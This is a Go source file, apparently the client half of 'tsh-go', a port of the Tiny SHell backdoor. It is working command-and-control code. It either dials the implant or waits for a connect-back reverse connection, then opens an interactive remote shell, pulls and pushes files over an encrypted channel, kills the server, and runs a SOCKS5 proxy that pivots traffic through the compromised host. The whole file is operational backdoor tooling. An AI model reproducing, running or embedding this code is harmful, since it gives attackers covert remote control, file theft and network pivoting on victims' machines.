package client

import (
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/utils"

	"github.com/schollz/progressbar/v3"
	terminal "golang.org/x/term"
)

type RunShellArgs struct {
	Command string
}

type GetFileArgs struct {
	Src string
	Dst string
}

type PutFileArgs struct {
	Src string
	Dst string
}

type Socks5Args struct {
	Socks5Addr string
}

func Run(secret []byte, host string, port int, mode uint8, arg any) {
	var isConnectBack bool

	if host == "cb" {
		isConnectBack = true
	}

	waitForConnection := func() *pel.PktEncLayer {
		if isConnectBack {
			addr := fmt.Sprintf(":%d", port)
			ln, err := pel.Listen(addr, secret, false)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			fmt.Print("Waiting for the server to connect...")
			layer, err := ln.Accept()
			ln.Close()
			fmt.Println("connected.")
			if err != nil {
				fmt.Fprintf(os.Stderr, "%v\n", err)
				os.Exit(1)
			}
			layer.Write([]byte{mode})
			return layer
		} else {
			addr := fmt.Sprintf("%s:%d", host, port)
			layer, err := pel.Dial(addr, secret, true)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%v\n", err)
				os.Exit(1)
			}
			layer.Write([]byte{mode})
			return layer
		}
	}

	switch mode {
	case constants.Kill:
		layer := waitForConnection()
		layer.Close()
		fmt.Println("Server killed")
	case constants.RunShell:
		handleRunShell(waitForConnection, arg.(RunShellArgs))
	case constants.GetFile:
		handleGetFile(waitForConnection, arg.(GetFileArgs))
	case constants.PutFile:
		handlePutFile(waitForConnection, arg.(PutFileArgs))
	case constants.SOCKS5:
		handleSocks5(waitForConnection, arg.(Socks5Args))
	}
}

func handleGetFile(waitForConnection func() *pel.PktEncLayer, arg GetFileArgs) {
	layer := waitForConnection()
	defer layer.Close()
	buffer := make([]byte, constants.MaxMessagesize)

	basename := strings.ReplaceAll(arg.Src, "\\", "/")
	basename = filepath.Base(filepath.FromSlash(basename))

	destination := arg.Dst

	// if dst is a directory, save file to dst/basename
	// otherwise, save file to dst
	if fi, err := os.Stat(destination); err == nil && fi.IsDir() {
		destination = filepath.Join(destination, basename)
	}

	f, err := os.OpenFile(destination, os.O_CREATE|os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	_, err = layer.Write([]byte(arg.Src))
	if err != nil {
		return
	}
	bar := progressbar.NewOptions(-1,
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Downloading"),
		progressbar.OptionSpinnerType(22),
	)
	utils.CopyBuffer(io.MultiWriter(f, bar), layer, buffer)
	fmt.Print("\nDone.\n")
}

func handlePutFile(waitForConnection func() *pel.PktEncLayer, arg PutFileArgs) {
	layer := waitForConnection()
	defer layer.Close()
	buffer := make([]byte, constants.MaxMessagesize)
	f, err := os.Open(arg.Src)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}
	fsize := fi.Size()

	basename := filepath.Base(arg.Src)
	_, err = layer.Write([]byte(arg.Dst))
	if err != nil {
		fmt.Println(err)
		return
	}
	_, err = layer.Write([]byte(basename))
	if err != nil {
		fmt.Println(err)
		return
	}
	bar := progressbar.NewOptions(int(fsize),
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Uploading"),
	)
	utils.CopyBuffer(io.MultiWriter(layer, bar), f, buffer)
	fmt.Print("\nDone.\n")
}

func handleRunShell(waitForConnection func() *pel.PktEncLayer, arg RunShellArgs) {
	layer := waitForConnection()
	defer layer.Close()
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return
	}

	defer func() {
		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
		_ = recover()
	}()

	term := os.Getenv("TERM")
	if term == "" {
		term = "vt100"
	}
	_, err = layer.Write([]byte(term))
	if err != nil {
		return
	}

	ws_col, ws_row, _ := terminal.GetSize(int(os.Stdout.Fd()))
	ws := make([]byte, 4)
	ws[0] = byte((ws_row >> 8) & 0xFF)
	ws[1] = byte((ws_row) & 0xFF)
	ws[2] = byte((ws_col >> 8) & 0xFF)
	ws[3] = byte((ws_col) & 0xFF)
	_, err = layer.Write(ws)
	if err != nil {
		return
	}

	_, err = layer.Write([]byte(arg.Command))
	if err != nil {
		return
	}

	ch := make(chan struct{})
	go func() {
		utils.StreamPipe(layer, os.Stdout, make([]byte, constants.MaxMessagesize))
		ch <- struct{}{} // we can close once the remote connection is closed, no need to wait for stdin close
	}()
	go utils.StreamPipe(os.Stdin, layer, make([]byte, constants.MaxMessagesize))
	<-ch
}
func handleSocks5(waitForConnection func() *pel.PktEncLayer, arg Socks5Args) {
	addr, err := net.ResolveTCPAddr("tcp", arg.Socks5Addr)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	l, err := net.ListenTCP("tcp", addr)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	fmt.Println("Socks5 proxy listening at", l.Addr())
	for {
		conn, err := l.Accept()
		if err != nil {
			panic(err)
		}
		layer := waitForConnection()
		fmt.Println("Connection established", conn.RemoteAddr())
		wg := &sync.WaitGroup{}
		wg.Add(2)
		go func() {
			utils.StreamPipe(layer, conn, make([]byte, constants.MaxMessagesize))
			wg.Done()
		}()
		go func() {
			utils.StreamPipe(conn, layer, make([]byte, constants.MaxMessagesize))
			wg.Done()
		}()
		go func() {
			wg.Wait()
			layer.Close()
			conn.Close()
			fmt.Println("Connection closed", conn.RemoteAddr())
		}()
	}
}
